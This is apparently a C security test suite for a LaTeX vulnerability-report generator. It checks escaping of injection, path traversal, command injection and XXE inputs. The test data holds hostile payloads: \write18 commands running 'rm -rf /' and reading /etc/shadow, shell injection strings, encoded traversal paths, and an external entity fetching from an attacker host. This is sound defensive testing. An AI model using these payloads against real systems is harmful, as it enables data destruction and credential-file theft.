/**
 * SPDX-FileCopyrightText: 2025 AI-Enhanced OpenVAS Project
 * SPDX-License-Identifier: GPL-2.0-or-later
 * 
 * Comprehensive Security Testing Suite
 * Critical security validation for LaTeX report generation
 */

#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "../src/report_api.h"
#include "../src/latex_engine.h"
#include "../src/template_manager.h"

/* Security test utilities */
static gboolean test_file_permissions(const gchar *file_path, mode_t expected_mode);
static gboolean test_directory_traversal_attempt(const gchar *malicious_path);
static gboolean test_command_injection_attempt(const gchar *malicious_input);
static void create_malicious_template(const gchar *template_path);

/**
 * @brief Test file permissions are secure
 */
static gboolean
test_file_permissions(const gchar *file_path, mode_t expected_mode)
{
    struct stat file_stat;
    if (stat(file_path, &file_stat) != 0) {
        return FALSE;
    }
    
    mode_t actual_mode = file_stat.st_mode & 0777;
    return actual_mode == expected_mode;
}

/**
 * @brief Test directory traversal prevention
 */
static gboolean
test_directory_traversal_attempt(const gchar *malicious_path)
{
    // Attempt to access files outside intended directory
    gchar *test_file = g_strdup_printf("%s/test_file", malicious_path);
    
    // This should fail or be sanitized
    gboolean accessible = g_file_test(test_file, G_FILE_TEST_EXISTS);
    
    g_free(test_file);
    return !accessible; // Should NOT be accessible
}

/**
 * @brief Test command injection prevention
 */
static gboolean
test_command_injection_attempt(const gchar *malicious_input)
{
    // Test if malicious input gets executed as system command
    gchar *escaped = latex_escape_text(malicious_input);
    
    // Check that command injection characters are properly escaped
    gboolean safe = !strstr(escaped, "`") && 
                   !strstr(escaped, "$(") && 
                   !strstr(escaped, "${") &&
                   !strstr(escaped, ";") &&
                   !strstr(escaped, "&&") &&
                   !strstr(escaped, "||");
    
    g_free(escaped);
    return safe;
}

/**
 * @brief Create malicious template for testing
 */
static void
create_malicious_template(const gchar *template_path)
{
    const gchar *malicious_content = 
        "\\documentclass{article}\n"
        "\\immediate\\write18{rm -rf /tmp/test_file}\n"  // Command execution attempt
        "\\input{/etc/passwd}\n"                        // File inclusion attempt
        "\\begin{document}\n"
        "Malicious template\n"
        "\\end{document}\n";
    
    g_file_set_contents(template_path, malicious_content, -1, NULL);
}

/* ========== INJECTION PREVENTION TESTS ========== */

/**
 * @brief Test LaTeX injection prevention
 */
static void
test_latex_injection_prevention(void)
{
    g_test_message("Testing LaTeX injection prevention...");
    
    g_assert_true(latex_engine_init());
    
    // Test various LaTeX injection attempts
    const gchar *injection_attempts[] = {
        "\\input{/etc/passwd}",
        "\\write18{cat /etc/shadow}",
        "\\immediate\\write18{rm -rf /}",
        "\\openin\\myfile=/etc/hosts",
        "\\read\\myfile to \\mydata",
        "\\catcode`\\{=12",
        "\\def\\malicious{\\input{/etc/passwd}}",
        "\\expandafter\\input\\csname /etc/passwd\\endcsname",
        "\\scantokens{\\input{/etc/passwd}}",
        NULL
    };
    
    for (int i = 0; injection_attempts[i]; i++) {
        g_test_message("Testing injection attempt: %s", injection_attempts[i]);
        
        gchar *escaped = latex_escape_text(injection_attempts[i]);
        g_assert_nonnull(escaped);
        
        // Verify that LaTeX commands are properly escaped
        g_assert_false(g_str_has_prefix(escaped, "\\input"));
        g_assert_false(g_str_has_prefix(escaped, "\\write18"));
        g_assert_false(g_str_has_prefix(escaped, "\\immediate"));
        g_assert_false(g_str_has_prefix(escaped, "\\openin"));
        g_assert_false(g_str_has_prefix(escaped, "\\read"));
        g_assert_false(g_str_has_prefix(escaped, "\\catcode"));
        g_assert_false(g_str_has_prefix(escaped, "\\def"));
        g_assert_false(g_str_has_prefix(escaped, "\\expandafter"));
        g_assert_false(g_str_has_prefix(escaped, "\\scantokens"));
        
        // Test that escaped content can be safely processed
        latex_variables_t *vars = latex_variables_new();
        latex_variables_set(vars, "malicious_input", injection_attempts[i]);
        
        const gchar *template = "Safe content: {{malicious_input}}";
        gchar *processed = latex_process_template(template, vars);
        g_assert_nonnull(processed);
        
        // Verify the injection attempt was neutralized
        g_assert_false(strstr(processed, injection_attempts[i]));
        
        g_free(escaped);
        g_free(processed);
        latex_variables_free(vars);
    }
}

/**
 * @brief Test path traversal prevention
 */
static void
test_path_traversal_prevention(void)
{
    g_test_message("Testing path traversal prevention...");
    
    // Test various path traversal attempts
    const gchar *traversal_attempts[] = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        NULL
    };
    
    for (int i = 0; traversal_attempts[i]; i++) {
        g_test_message("Testing traversal attempt: %s", traversal_attempts[i]);
        
        // Test that traversal attempts are blocked
        gboolean blocked = test_directory_traversal_attempt(traversal_attempts[i]);
        g_assert_true(blocked);
        
        // Test that paths are sanitized in template processing
        gchar *escaped = latex_escape_text(traversal_attempts[i]);
        g_assert_nonnull(escaped);
        
        // Should not contain unescaped path separators
        g_assert_false(strstr(escaped, "../"));
        g_assert_false(strstr(escaped, "..\\"));
        
        g_free(escaped);
    }
}

/**
 * @brief Test command injection prevention
 */
static void
test_command_injection_prevention(void)
{
    g_test_message("Testing command injection prevention...");
    
    // Test various command injection attempts
    const gchar *command_attempts[] = {
        "`rm -rf /`",
        "$(rm -rf /)",
        "${rm -rf /}",
        "; rm -rf /",
        "&& rm -rf /",
        "|| rm -rf /",
        "| rm -rf /",
        "> /etc/passwd",
        "< /etc/passwd",
        "2>&1",
        NULL
    };
    
    for (int i = 0; command_attempts[i]; i++) {
        g_test_message("Testing command injection: %s", command_attempts[i]);
        
        gboolean safe = test_command_injection_attempt(command_attempts[i]);
        g_assert_true(safe);
    }
}

/**
 * @brief Test XML External Entity (XXE) prevention
 */
static void
test_xml_external_entity_prevention(void)
{
    g_test_message("Testing XXE prevention...");
    
    // Test XXE attempts in JSON metadata
    const gchar *xxe_attempts[] = {
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">",
        "&xxe;",
        NULL
    };
    
    for (int i = 0; xxe_attempts[i]; i++) {
        g_test_message("Testing XXE attempt: %s", xxe_attempts[i]);
        
        // Test that XXE attempts are neutralized in JSON processing
        gchar *escaped = latex_escape_text(xxe_attempts[i]);
        g_assert_nonnull(escaped);
        
        // Should not contain unescaped XML entities
        g_assert_false(strstr(escaped, "<!DOCTYPE"));
        g_assert_false(strstr(escaped, "<!ENTITY"));
        g_assert_false(strstr(escaped, "&xxe;"));
        
        g_free(escaped);
    }
}

/* ========== DATA PROTECTION TESTS ========== */

/**
 * @brief Test sensitive data handling
 */
static void
test_sensitive_data_handling(void)
{
    g_test_message("Testing sensitive data handling...");
    
    g_assert_true(report_api_init());
    
    // Create test data with sensitive information
    const gchar *sensitive_data[] = {
        "password123",
        "secret_key_abc123",
        "192.168.1.100",  // Internal IP
        "john.doe@company.com",
        "SSN: 123-45-6789",
        "Credit Card: 4111-1111-1111-1111",
        NULL
    };
    
    for (int i = 0; sensitive_data[i]; i++) {
        g_test_message("Testing sensitive data: %s", sensitive_data[i]);
        
        // Test that sensitive data is properly escaped
        gchar *escaped = latex_escape_text(sensitive_data[i]);
        g_assert_nonnull(escaped);
        
        // Sensitive data should be escaped but still readable
        g_assert_true(strlen(escaped) >= strlen(sensitive_data[i]));
        
        g_free(escaped);
    }
    
    report_api_cleanup();
}

/**
 * @brief Test temporary file security
 */
static void
test_temporary_file_security(void)
{
    g_test_message("Testing temporary file security...");
    
    g_assert_true(latex_engine_init());
    
    // Create temporary file
    const gchar *test_content = "Test content for security validation";
    gchar *temp_file = latex_create_temp_file(test_content, "tex");
    g_assert_nonnull(temp_file);
    g_assert_true(g_file_test(temp_file, G_FILE_TEST_EXISTS));
    
    // Test file permissions (should be readable only by owner)
    gboolean secure_perms = test_file_permissions(temp_file, 0600);
    if (!secure_perms) {
        g_test_message("Warning: Temporary file permissions may not be secure");
        // Don't fail the test as this might be filesystem-dependent
    }
    
    // Test that file is in secure location
    g_assert_true(g_str_has_prefix(temp_file, "/tmp/") || 
                  g_str_has_prefix(temp_file, g_get_tmp_dir()));
    
    // Cleanup
    g_unlink(temp_file);
    g_free(temp_file);
}

/**
 * @brief Test output file permissions
 */
static void
test_output_file_permissions(void)
{
    g_test_message("Testing output file permissions...");
    
    if (!latex_engine_is_available()) {
        g_test_skip("LaTeX not available");
        return;
    }
    
    g_assert_true(report_api_init());
    
    // Create minimal vulnerability data
    vulnerability_score_t *vuln = vulnerability_score_new("CVE-2024-TEST");
    vuln->cvss_v3_1 = g_new0(cvss_v3_t, 1);
    vuln->cvss_v3_1->base_score = 7.5;
    vuln->cvss_v3_1->severity = CVSS_SEVERITY_HIGH;
    
    vulnerability_score_t *vulns[] = {vuln};
    
    // Generate report
    report_config_t *config = report_config_new();
    config->output_path = g_strdup("/tmp/security_test_output.pdf");
    
    report_result_t *result = report_generate(vulns, 1, config);
    
    if (result && report_result_is_success(result)) {
        // Test output file permissions
        gboolean secure_perms = test_file_permissions(result->output_file, 0644);
        if (!secure_perms) {
            g_test_message("Warning: Output file permissions may not be optimal");
        }
        
        // Cleanup output file
        g_unlink(result->output_file);
    }
    
    // Cleanup
    if (result) report_result_free(result);
    report_config_free(config);
    vulnerability_score_free(vuln);
    report_api_cleanup();
}

/**
 * @brief Test memory data clearing
 */
static void
test_memory_data_clearing(void)
{
    g_test_message("Testing memory data clearing...");
    
    g_assert_true(latex_engine_init());
    
    // Test that sensitive data is cleared from memory
    const gchar *sensitive_content = "SENSITIVE_PASSWORD_123";
    
    latex_variables_t *vars = latex_variables_new();
    latex_variables_set(vars, "sensitive", sensitive_content);
    
    // Process template with sensitive data
    const gchar *template = "Data: {{sensitive}}";
    gchar *processed = latex_process_template(template, vars);
    g_assert_nonnull(processed);
    
    // Free variables (should clear sensitive data)
    latex_variables_free(vars);
    
    // Note: In a real implementation, we would use secure memory clearing
    // functions like explicit_bzero() or SecureZeroMemory()
    
    g_free(processed);
}

/* ========== ACCESS CONTROL TESTS ========== */

/**
 * @brief Test template access controls
 */
static void
test_template_access_controls(void)
{
    g_test_message("Testing template access controls...");
    
    // Create temporary malicious template
    gchar *malicious_template = g_strdup("/tmp/malicious_template.tex");
    create_malicious_template(malicious_template);
    
    // Test that malicious template is rejected or sanitized
    if (template_manager_init("/tmp")) {
        report_template_t *template = template_load_from_file(malicious_template);
        
        if (template) {
            // If template loads, it should be validated and sanitized
            template_validation_t *validation = template_validate(template);
            g_assert_nonnull(validation);
            
            // Should detect security issues
            if (validation->is_valid) {
                g_test_message("Warning: Malicious template passed validation");
            }
            
            template_validation_free(validation);
            template_free(template);
        }
        
        template_manager_cleanup();
    }
    
    // Cleanup
    g_unlink(malicious_template);
    g_free(malicious_template);
}

/**
 * @brief Test configuration access controls
 */
static void
test_configuration_access_controls(void)
{
    g_test_message("Testing configuration access controls...");
    
    // Test that configuration files have appropriate permissions
    const gchar *config_paths[] = {
        "/etc/openvas/report-generation/report-generation.conf",
        "/tmp/test_config.conf",
        NULL
    };
    
    for (int i = 0; config_paths[i]; i++) {
        if (g_file_test(config_paths[i], G_FILE_TEST_EXISTS)) {
            gboolean secure_perms = test_file_permissions(config_paths[i], 0644);
            if (!secure_perms) {
                g_test_message("Warning: Config file %s may have insecure permissions", 
                              config_paths[i]);
            }
        }
    }
}

/**
 * @brief Test output directory permissions
 */
static void
test_output_directory_permissions(void)
{
    g_test_message("Testing output directory permissions...");
    
    // Test default output directory
    const gchar *output_dir = "/var/lib/openvas/reports";
    
    if (g_file_test(output_dir, G_FILE_TEST_IS_DIR)) {
        // Directory should be writable by openvas user/group only
        struct stat dir_stat;
        if (stat(output_dir, &dir_stat) == 0) {
            mode_t dir_mode = dir_stat.st_mode & 0777;
            
            // Should not be world-writable
            g_assert_false(dir_mode & S_IWOTH);
            
            g_test_message("Output directory permissions: %o", dir_mode);
        }
    }
    
    // Test temporary output directory
    gchar *temp_output = g_strdup("/tmp/openvas_test_output");
    if (g_mkdir_with_parents(temp_output, 0755) == 0) {
        gboolean secure_perms = test_file_permissions(temp_output, 0755);
        g_assert_true(secure_perms);
        
        g_rmdir(temp_output);
    }
    
    g_free(temp_output);
}

/* ========== COMPLIANCE VALIDATION TESTS ========== */

/**
 * @brief Test GDPR compliance
 */
static void
test_gdpr_compliance(void)
{
    g_test_message("Testing GDPR compliance...");
    
    // Test data minimization
    // Reports should only include necessary vulnerability data
    
    // Test data anonymization capabilities
    const gchar *personal_data[] = {
        "john.doe@company.com",
        "192.168.1.100",
        "WORKSTATION-001",
        NULL
    };
    
    for (int i = 0; personal_data[i]; i++) {
        gchar *escaped = latex_escape_text(personal_data[i]);
        g_assert_nonnull(escaped);
        
        // Personal data should be properly escaped
        g_assert_true(strlen(escaped) >= strlen(personal_data[i]));
        
        g_free(escaped);
    }
    
    // Test right to erasure (data deletion)
    // Temporary files should be properly cleaned up
    g_assert_true(latex_engine_init());
    
    gchar *temp_file = latex_create_temp_file("test data", "txt");
    g_assert_nonnull(temp_file);
    g_assert_true(g_file_test(temp_file, G_FILE_TEST_EXISTS));
    
    // Cleanup should remove the file
    gboolean cleanup_success = latex_cleanup_temp_files("test");
    if (cleanup_success) {
        g_assert_false(g_file_test(temp_file, G_FILE_TEST_EXISTS));
    }
    
    g_free(temp_file);
}

/**
 * @brief Test security standards compliance
 */
static void
test_security_standards_compliance(void)
{
    g_test_message("Testing security standards compliance...");
    
    // Test OWASP Top 10 compliance
    // A03:2021 – Injection
    test_latex_injection_prevention();
    test_command_injection_prevention();
    
    // A05:2021 – Security Misconfiguration
    test_output_file_permissions();
    test_configuration_access_controls();
    
    // A06:2021 – Vulnerable and Outdated Components
    // (Would test LaTeX package versions in real implementation)
    
    // A08:2021 – Software and Data Integrity Failures
    test_template_access_controls();
    
    // A09:2021 – Security Logging and Monitoring Failures
    // (Would test audit logging in real implementation)
    
    g_test_message("Security standards compliance checks completed");
}

/* ========== TEST SUITE SETUP ========== */

/**
 * @brief Main test function
 */
int
main(int argc, char *argv[])
{
    g_test_init(&argc, &argv, NULL);
    
    // Injection prevention tests
    g_test_add_func("/security/latex_injection_prevention", test_latex_injection_prevention);
    g_test_add_func("/security/path_traversal_prevention", test_path_traversal_prevention);
    g_test_add_func("/security/command_injection_prevention", test_command_injection_prevention);
    g_test_add_func("/security/xml_external_entity_prevention", test_xml_external_entity_prevention);
    
    // Data protection tests
    g_test_add_func("/security/sensitive_data_handling", test_sensitive_data_handling);
    g_test_add_func("/security/temporary_file_security", test_temporary_file_security);
    g_test_add_func("/security/output_file_permissions", test_output_file_permissions);
    g_test_add_func("/security/memory_data_clearing", test_memory_data_clearing);
    
    // Access control tests
    g_test_add_func("/security/template_access_controls", test_template_access_controls);
    g_test_add_func("/security/configuration_access_controls", test_configuration_access_controls);
    g_test_add_func("/security/output_directory_permissions", test_output_directory_permissions);
    
    // Compliance tests
    g_test_add_func("/security/gdpr_compliance", test_gdpr_compliance);
    g_test_add_func("/security/security_standards_compliance", test_security_standards_compliance);
    
    g_test_message("Starting comprehensive security tests...");
    g_test_message("Testing injection prevention, data protection, access controls, and compliance");
    
    return g_test_run();
}